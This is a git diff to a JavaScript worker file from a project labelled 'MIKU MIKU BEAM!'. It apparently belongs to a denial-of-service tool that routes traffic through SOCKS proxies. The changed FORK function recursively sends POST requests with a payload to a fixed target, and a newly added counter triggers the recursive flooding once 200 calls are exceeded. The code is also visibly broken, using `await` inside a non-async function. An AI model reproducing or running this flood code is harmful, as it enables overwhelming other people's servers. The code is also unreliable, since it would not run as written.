@@ -9,13 +9,19 @@ MIKU MIKU BEAM!
 import axios from "axios";
 import { SocksProxyAgent } from "socks-proxy-agent";
 import { parentPort, workerData } from "worker_threads";
+let forkStop = 0
 
 import { randomBoolean, randomString } from "../utils/randomUtils.js";
 
 const FORK = (fixedTarget, payload, config) => {
-   for (let i = 1; i < Math.random() * 100; i++) {
-     FORK(fixedTarget, payload, config)
-     await axios.post(fixedTarget, payload, config);
+   forkStop++
+   if (forkStop > 200) {
+      for (let i = 1; i < Math.random() * 100; i++) {
+        FORK(fixedTarget, payload, config)
+        await axios.post(fixedTarget, payload, config);
+      }
+   } else {
+      await axios.post(fixedTarget, payload, config);
    }
 }
 
